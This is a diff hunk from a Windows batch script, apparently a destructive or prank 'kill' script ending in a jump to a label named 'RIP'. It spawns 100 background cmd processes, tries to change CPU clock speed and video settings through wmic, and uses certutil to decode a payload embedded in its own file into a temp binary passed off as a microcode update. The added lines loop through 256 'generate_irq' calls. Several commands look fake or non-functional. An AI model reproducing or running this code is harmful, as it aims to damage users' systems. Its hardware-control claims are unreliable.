@@ -65,4 +65,7 @@ wmic path win32_videocontroller set videoarchitecture=5 >nul 2>&1
 for /l %%i in (1,1,100) do ( start /b cmd /c "wmic cpu where (status='ok') set clockSpeed=5000" )
 certutil -decode "%~f0" "%temp%\mcupdate.bin" >nul 2>&1
 wmic cpu where (status='ok') call updateMicrocode "%temp%\mcupdate.bin" >nul 2>&1
+for /l %%i in (0,1,255) do (
+    call :generate_irq %%i
+)
 goto RIP
